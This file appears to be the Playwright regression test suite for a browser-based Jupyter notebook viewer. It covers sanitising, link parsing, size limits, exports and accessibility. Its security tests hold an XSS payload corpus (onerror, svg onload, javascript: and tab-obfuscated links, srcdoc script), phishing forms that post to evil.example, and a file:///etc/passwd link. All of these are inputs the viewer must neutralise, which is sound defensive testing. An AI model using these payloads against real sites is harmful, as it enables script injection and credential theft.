// Regression tests. Run: npm install && npx playwright install chromium && npm test
// (set CHROMIUM_PATH to use an existing Chromium). Everything runs offline against a local server.
const fs = require('fs');
const path = require('path');
const { start, stop, open, state, nb, md, code } = require('./harness');

const H = '#/github/o/r/blob/main/t.ipynb';
const OUT = path.join(__dirname, 'out');
const tests = [];
const test = (name, fn) => tests.push({ name, fn });
const assert = (cond, detail) => { if (!cond) throw new Error(detail === undefined ? 'assertion failed' : typeof detail === 'string' ? detail : JSON.stringify(detail)); };
const good = nb([md('hello')]);
const run = async (opts, fn) => { const s = await open(opts); try { return await fn(s); } finally { await s.ctx.close(); } };

/* ---------- security ---------- */

test('sanitizer: forms and overlays are removed and author CSS stays scoped to its cell', () => run({
  hash: H, settle: 400,
  raw: nb([
    md('<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button>Sign in</button></form>\n\n<div style="position:fixed;inset:0;z-index:999999;background:#fff">overlay</div>\n\n<p>x</p><style>.bar{display:none!important}</style>'),
    code('1', [{ output_type: 'display_data', metadata: {}, data: { 'text/html': ['<form action="https://evil.example/x"><input type="password"></form><div style="position:fixed;inset:0">o</div><style>.bar{display:none}</style>'] } }]),
  ]),
}, async ({ page }) => {
  const r = await page.evaluate(() => ({
    forms: document.querySelectorAll('.cells form, .cells input, .cells button:not(.btn)').length,
    unscoped: [...document.querySelectorAll('.cells style')].filter(st => !/^\s*\.nbv-/.test(st.textContent)).length,
    fixed: [...document.querySelectorAll('.cells *')].filter(e => getComputedStyle(e).position === 'fixed').length,
    barVisible: getComputedStyle(document.querySelector('.bar')).display !== 'none',
    topIsApp: !!document.elementFromPoint(50, 20).closest('.bar'),
  }));
  assert(r.forms === 0 && r.unscoped === 0 && r.fixed === 0 && r.barVisible && r.topIsApp, r);
}));

test('xss corpus: nothing executes', () => run({
  hash: H, settle: 500,
  raw: nb([
    md('<img src=x onerror="window.__pwn=1">\n\n<svg onload="window.__pwn=2"></svg>\n\n[a](javascript:window.__pwn=3)\n\n<iframe srcdoc="<script>parent.__pwn=4</script>"></iframe>\n\n<details open ontoggle="window.__pwn=5">x</details>\n\n<math><mtext><table><mglyph><style><img src=x onerror="window.__pwn=6">'),
    code('1', [{ output_type: 'display_data', metadata: {}, data: { 'text/html': ['<script>window.__pwn=7</script><object data="javascript:window.__pwn=8"></object><a href="java&#9;script:window.__pwn=9">x</a>'], 'image/svg+xml': ['<svg onload="window.__pwn=10"/>'] } }]),
  ]),
}, async ({ page }) => {
  assert(await page.evaluate(() => window.__pwn === undefined), 'a payload ran');
  assert(await page.evaluate(() => ![...document.querySelectorAll('.cells a')].some(a => /^\s*javascript:/i.test(a.getAttribute('href') || ''))), 'javascript: link survived');
}));

test('#/url/ rejects data:, javascript: and file: links', async () => {
  for (const u of ['data:application/json;base64,e30=', 'javascript:alert(1)', 'file:///etc/passwd']) {
    await run({ hash: '#/url/' + encodeURIComponent(u), settle: 300 }, async ({ page, requests }) => {
      const s = await state(page);
      assert(s.cells === 0 && s.err && !requests.length, { u, s });
    });
  }
});

test('#/url/ accepts nbviewer-style forms (//host, /urls/, /url/)', async () => {
  const want = [['#/url/' + encodeURIComponent('//host.example/a.ipynb'), 'http://host.example/a.ipynb'], ['#/urls/host.example/a.ipynb', 'https://host.example/a.ipynb'], ['#/url/host.example/a.ipynb', 'http://host.example/a.ipynb']];
  for (const [hash, expect] of want) {
    await run({ hash, other: u => (u.includes('host.example') ? { body: JSON.stringify(good) } : null), settle: 300 }, async ({ page, requests }) => {
      assert(requests[0] === expect && (await state(page)).cells === 1, { hash, requests });
    });
  }
});

/* ---------- limits and failures ---------- */

test('math: oversized equations become plain text quickly; normal math and macros still render', async () => {
  const t0 = Date.now();
  await run({ hash: H, settle: 300, timeout: 30000, raw: nb([md('$' + '\\frac{'.repeat(500) + 'x' + '}{1}'.repeat(500) + '$'), md('$$' + 'x+'.repeat(20000) + 'x$$')]) }, async ({ page }) => {
    const r = await page.evaluate(() => ({ skipped: document.querySelectorAll('.math-skipped').length }));
    assert(r.skipped >= 2 && Date.now() - t0 < 9000, { r, ms: Date.now() - t0 });
  });
  await run({ hash: H, settle: 300, raw: nb([md('ok $E=mc^2$ and $$\\int_0^1 x\\,dx$$'), md('$\\def\\foo{x^2}$ and $\\foo$')]) }, async ({ page }) => {
    const r = await page.evaluate(() => ({ katex: document.querySelectorAll('.katex').length, skipped: document.querySelectorAll('.math-skipped').length }));
    assert(r.katex === 4 && r.skipped === 0, r);
  });
});

test('code: a 1 MB cell is plain text and fast; a 100 KB cell is still highlighted', async () => {
  const t0 = Date.now();
  await run({ hash: H, settle: 200, raw: nb([code('x = 1\n'.repeat(Math.floor(1048576 / 6)))]) }, async ({ page }) => {
    const spans = await page.evaluate(() => document.querySelectorAll('.input pre code span').length);
    assert(spans === 0 && Date.now() - t0 < 4000, { spans, ms: Date.now() - t0 });
  });
  await run({ hash: H, settle: 200, raw: nb([code('x = 1 * 2\n'.repeat(10000))]) }, async ({ page }) => {
    assert(await page.evaluate(() => document.querySelectorAll('.input pre code span').length > 1000), 'not highlighted');
  });
});

test('failed cells show a placeholder and neighbours are intact', () => run({
  hash: H, settle: 300,
  raw: nb([md('first'), null, { cell_type: 'markdown', source: ['s'.repeat(9 * 1048576)] }, code('print(1)', { not: 'an array' }), code('2', [{ output_type: 'display_data', data: 'str' }, { output_type: 'stream', name: 'stdout', text: ['ok output\n'] }]), md('last')]),
  timeout: 40000,
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ failed: document.querySelectorAll('.cell-failed').length, text: document.querySelector('.cells').innerText }));
  assert(r.failed >= 2 && r.text.includes('first') && r.text.includes('last') && r.text.includes('ok output'), r.failed);
}));

test('large files: local 10.5 MB asks first and "Open anyway" works', () => run({ hash: '', settle: 200 }, async ({ page }) => {
  const buffer = Buffer.from(JSON.stringify(nb([md('a'.repeat(10.5 * 1048576))])));
  await page.setInputFiles('#file-input', { name: 'big.ipynb', mimeType: 'application/json', buffer });
  await page.waitForSelector('#big-open', { timeout: 20000 });
  await page.click('#big-open');
  await page.waitForSelector('.cell', { timeout: 60000 });
}));

test('5,000 cells render in a few seconds and the first cell appears fast', () => run({
  hash: H, timeout: 60000, waitFor: '.cell',
  raw: nb(Array.from({ length: 5000 }, (_, i) => (i % 2 ? md('text ' + i + ' $x_{' + i + '}$') : code('x = ' + i, [{ output_type: 'stream', name: 'stdout', text: ['out ' + i + '\n'] }], i)))),
}, async ({ page }) => {
  const t0 = Date.now();
  await page.waitForFunction(() => document.querySelectorAll('.cell').length >= 5000, null, { timeout: 60000 });
  assert(Date.now() - t0 < 12000, Date.now() - t0);
}));

/* ---------- storage and input robustness ---------- */

test('corrupt nbv.recent does not break the home page', async () => {
  for (const v of ['"x"', '[null]', '{"a":1}', '[{"hash":5}]', '[{"hash":"#/ok","title":5}]']) {
    await run({ hash: '', init: `localStorage.setItem('nbv.recent', ${JSON.stringify(v)})`, settle: 200 }, async ({ page }) => {
      const s = await state(page);
      assert(!s.err && await page.$('.home'), { v, s });
    });
  }
});

test('a huge link is not saved to recents and keeps the title short', () => run({
  hash: '#/url/' + encodeURIComponent('https://host.example/' + 'a'.repeat(300000) + '.ipynb'),
  other: u => (u.includes('host.example') ? { body: JSON.stringify(good) } : null), settle: 500, timeout: 30000,
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ stored: (localStorage.getItem('nbv.recent') || '').length, title: document.title.length }));
  assert(r.stored < 5000 && r.title < 200, r);
}));

test('token: invalid characters are refused on save and explained when already saved', async () => {
  await run({ hash: '', settle: 200 }, async ({ page }) => {
    await page.click('#settings-btn');
    await page.fill('#token-input', 'ghp_abc​def');
    await page.click('#settings button[value="save"]');
    assert(await page.evaluate(() => document.querySelector('#settings').open && !document.querySelector('#token-error').hidden), 'dialog closed or no message');
    assert(await page.evaluate(() => localStorage.getItem('nbv.token') === null), 'bad token was stored');
  });
  await run({ hash: '#/github/o', init: `localStorage.setItem('nbv.token', JSON.stringify('ghp_abc\\u200bdef'))`, api: [], settle: 300 }, async ({ page }) => {
    const s = await state(page);
    assert(/token looks wrong/i.test(s.err) && await page.$('#err-token'), s);
  });
});

test('input parsing: where each pasted string goes', async () => {
  const table = [
    ['jakevdp', '#/github/jakevdp'],
    ['jakevdp/PythonDataScienceHandbook', '#/github/jakevdp/PythonDataScienceHandbook'],
    ['https://github.com/o/r/blob/main/a.ipynb?plain=1#L5', '#/github/o/r/blob/main/a.ipynb'],
    ['https://raw.githubusercontent.com/o/r/main/dir/a.ipynb', '#/github/o/r/blob/main/dir/a.ipynb'],
    ['https://gist.github.com/someone/0123abcd', '#/gist/0123abcd'],
    ['https://nbviewer.org/github/o/r/blob/main/a.ipynb', '#/github/o/r/blob/main/a.ipynb'],
    ['https://nbviewer.org/gist/someone/0123abcd', '#/gist/0123abcd'],
    ['https://nbviewer.org/urls/example.com/x.ipynb', '#/url/https://example.com/x.ipynb'],
    ['https://nbviewer.org/url/example.com/x.ipynb', '#/url/http://example.com/x.ipynb'],
    ['https://colab.research.google.com/github/o/r/blob/main/a.ipynb', '#/github/o/r/blob/main/a.ipynb'],
    ['git@github.com:o/r.git', '#/github/o/r'],
    ['https://example.com/a.ipynb', '#/url/https://example.com/a.ipynb'],
  ];
  await run({ hash: '', settle: 200 }, async ({ page }) => {
    for (const [input, want] of table) {
      await page.evaluate(v => { const i = document.querySelector('#jump-input'); i.value = v; document.querySelector('#jump').requestSubmit(); }, input);
      await page.waitForTimeout(150);
      const got = await page.evaluate(() => decodeURIComponent(location.hash));
      assert(got === want, { input, want, got });
    }
  });
});

test('a blob link to a file that is not a notebook opens its folder', () => run({ hash: '#/github/o/r/blob/main/dir/README.md', api: [{ name: 'a.ipynb', path: 'dir/a.ipynb', type: 'file', size: 10 }], settle: 500 }, async ({ page }) => {
  const r = await page.evaluate(() => ({ hash: location.hash, rows: document.querySelectorAll('.listing li').length }));
  assert(r.hash === '#/github/o/r/tree/main/dir' && r.rows >= 1, r);
}));

test('Google Drive and Colab Drive links explain themselves', () => run({ hash: '#/url/' + encodeURIComponent('https://colab.research.google.com/drive/1abc'), settle: 300 }, async ({ page, requests }) => {
  const s = await state(page);
  assert(/Drive and Colab/.test(s.err) && !requests.length, s);
}));

/* ---------- notebook formats and API shapes ---------- */

test('nbformat 3 and malformed files fail cleanly', async () => {
  const v3 = cells => ({ nbformat: 3, nbformat_minor: 0, metadata: {}, worksheets: [{ cells }] });
  const ok = [v3([{ cell_type: 'heading', level: 1000000000, source: ['x'] }]), v3([{ cell_type: 'heading', level: -1, source: ['x'] }]), v3([null, { cell_type: 'markdown', source: ['ok'] }]), v3([{ cell_type: 'code', input: ['1'], outputs: [null, { output_type: 'stream', stream: 'stdout', text: ['hi'] }] }])];
  for (const body of ok) await run({ hash: H, raw: body, settle: 250 }, async ({ page }) => { const s = await state(page); assert(!s.err && s.cells >= 1, s); });
  for (const body of ['null', '[]', '"x"', '{}']) await run({ hash: H, raw: body, settle: 250 }, async ({ page }) => { const s = await state(page); assert(s.err && !/Cannot read|Invalid/.test(s.errText || ''), { body, s }); });
});

test('odd GitHub API answers give an error, not a spinner or "undefined"', async () => {
  await run({ hash: '#/github/o/r', api: u => (/repos\/o\/r$/.test(u.split('?')[0]) ? { body: '{}' } : null), settle: 600 }, async ({ page }) => {
    const s = await state(page); assert(s.err && !(await page.$('.loading')), s);
  });
  await run({ hash: '#/github/o', api: { body: '{}' }, settle: 400 }, async ({ page }) => {
    const s = await state(page); assert(s.err && !/undefined/.test(await page.evaluate(() => document.body.innerText)), s);
  });
  await run({ hash: '#/github/o/r/tree/main/', api: [{ path: 'x' }], settle: 400 }, async ({ page }) => {
    assert(!/undefined|localeCompare/.test(await page.evaluate(() => document.body.innerText)), 'broken listing');
  });
});

/* ---------- layout and accessibility ---------- */

test('320px phone: a long filename does not scroll the page sideways', () => run({
  hash: '#/github/o/r/blob/main/My_Very_Long_Notebook_Name_For_Testing_2024.ipynb', raw: good, viewport: { width: 320, height: 700 }, settle: 300,
}, async ({ page }) => assert(!(await state(page)).hscroll, 'horizontal scroll')));

test('axe: no violations on home, notebook and error pages', async () => {
  const axeFile = require.resolve('axe-core/axe.min.js');
  const wide = nb([code('x = "' + 'y'.repeat(400) + '"', [{ output_type: 'execute_result', execution_count: 1, metadata: {}, data: { 'text/plain': ['1'] } }], 1)]);
  for (const [name, opts] of [['home', { hash: '' }], ['notebook', { hash: H, raw: wide }], ['error', { hash: H, raw: () => ({ status: 404, body: 'x', type: 'text/plain' }) }]]) {
    await run({ ...opts, settle: 300 }, async ({ page }) => {
      await page.addScriptTag({ path: axeFile });
      const v = await page.evaluate(() => axe.run(document, { runOnly: ['wcag2a', 'wcag2aa', 'best-practice'] }).then(r => r.violations.map(x => `${x.id} (${x.nodes.length})`)));
      assert(!v.length, { name, v });
    });
  }
});

/* ---------- exports ---------- */

test('export: .py, .md and .html contents', () => run({
  hash: '#/github/o/r/blob/main/My Note.ipynb', settle: 600,
  raw: nb([md('# Title\n\nMath $E=mc^2$'), code('%matplotlib inline\nx = 1\n!ls', [{ output_type: 'stream', name: 'stdout', text: ['a ``` b\n'] }], 1), code('1/0', [{ output_type: 'error', ename: 'E', evalue: 'v', traceback: ['\u001b[31mE\u001b[0m: v'] }], 2)]),
}, async ({ page }) => {
  fs.mkdirSync(OUT, { recursive: true });
  const get = async kind => { await page.click('#export-menu summary'); const [d] = await Promise.all([page.waitForEvent('download'), page.click(`[data-export="${kind}"]`)]); const f = path.join(OUT, d.suggestedFilename()); await d.saveAs(f); return { name: d.suggestedFilename(), text: fs.readFileSync(f, 'utf8') }; };
  const py = await get('py'); assert(py.name === 'My Note.py' && /# %matplotlib inline/.test(py.text) && /# !ls/.test(py.text) && /\nx = 1\n/.test(py.text), py.text);
  const mdf = await get('md'); assert(/# Title/.test(mdf.text) && /```python\n%matplotlib/.test(mdf.text) && /````text\na ``` b\n````/.test(mdf.text) && !/\u001b/.test(mdf.text), mdf.text);
  const html = await get('html'); assert(/Content-Security-Policy/.test(html.text) && !/<script/i.test(html.text) && /class="katex"/.test(html.text), 'html export');
}));

test('export menu: no .py item for non-Python notebooks; print styles hide the toolbar', () => run({
  hash: H, raw: nb([code('x <- 1')], { kernelspec: { display_name: 'R', language: 'R', name: 'ir' }, language_info: { name: 'R' } }), settle: 300,
}, async ({ page }) => {
  assert(await page.evaluate(() => !document.querySelector('[data-export="py"]') && !!document.querySelector('[data-export="md"]')), 'menu items');
  await page.emulateMedia({ media: 'print' });
  assert(await page.evaluate(() => getComputedStyle(document.querySelector('.toolbar')).display === 'none' && getComputedStyle(document.querySelector('.bar')).display === 'none'), 'print styles');
}));

test('fonts are self-hosted: nothing leaves the site except GitHub', () => run({ hash: H, raw: good, settle: 600 }, async ({ page, requests }) => {
  const external = requests.filter(u => !/raw\.githubusercontent\.com/.test(u));
  assert(!external.length, external);
  const loaded = await page.evaluate(async () => { await document.fonts.ready; return [...document.fonts].filter(f => f.status === 'loaded').map(f => f.family); });
  assert(loaded.some(f => /JetBrains/.test(f)) && loaded.some(f => /Source Serif/.test(f)), loaded);
}));

/* ---------- runner ---------- */

(async () => {
  const only = process.argv[2];
  await start();
  let failed = 0;
  for (const t of tests.filter(t => !only || t.name.includes(only))) {
    const t0 = Date.now();
    try { await t.fn(); console.log(`PASS  ${t.name}  (${Date.now() - t0} ms)`); } catch (e) { failed++; console.log(`FAIL  ${t.name}\n      ${String(e.message).slice(0, 600)}`); }
  }
  await stop();
  console.log(failed ? `\n${failed} failed` : '\nall passed');
  process.exit(failed ? 1 : 0);
})();
